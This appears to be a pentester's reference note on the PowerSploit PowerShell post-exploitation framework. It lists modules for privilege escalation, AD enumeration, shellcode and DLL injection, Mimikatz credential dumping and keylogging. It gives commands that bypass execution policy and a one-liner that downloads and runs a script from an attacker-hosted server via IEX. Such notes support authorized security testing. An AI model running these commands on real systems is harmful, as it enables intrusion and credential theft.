---
tags: [tool, privesc, windows, powershell]
tool: "powersploit"
category: "Privesc"
installed: true
phase: [enumeration, privesc, post-exploit]
---

# PowerSploit - PowerShell Post-Exploitation Framework

## Tool Overview
Purpose: Collection of PowerShell modules for post-exploitation and privilege escalation
Location: /usr/share/powersploit/

## Key Modules

### Privesc Module
Location: /usr/share/powersploit/Privesc/
Tools:
- PowerUp.ps1 - Privilege escalation checks
- Get-System.ps1 - SYSTEM escalation

### Recon Module
Location: /usr/share/powersploit/Recon/
Tools:
- PowerView.ps1 - AD enumeration

### CodeExecution Module
Location: /usr/share/powersploit/CodeExecution/
Tools:
- Invoke-Shellcode.ps1 - Shellcode execution
- Invoke-DllInjection.ps1 - DLL injection

### Exfiltration Module
Location: /usr/share/powersploit/Exfiltration/
Tools:
- Get-GPPPassword.ps1 - Group Policy passwords
- Invoke-Mimikatz.ps1 - Credential dumping
- Get-Keystrokes.ps1 - Keylogger

## How to Use

Import PowerUp:
powershell -ep bypass
Import-Module /usr/share/powersploit/Privesc/PowerUp.ps1
Invoke-PrivescAudit

Import PowerView:
Import-Module /usr/share/powersploit/Recon/PowerView.ps1
Get-NetUser

Transfer to Target:
On Kali: cd /usr/share/powersploit && python3 -m http.server 8000
On target: powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/Privesc/PowerUp.ps1'); Invoke-PrivescAudit"
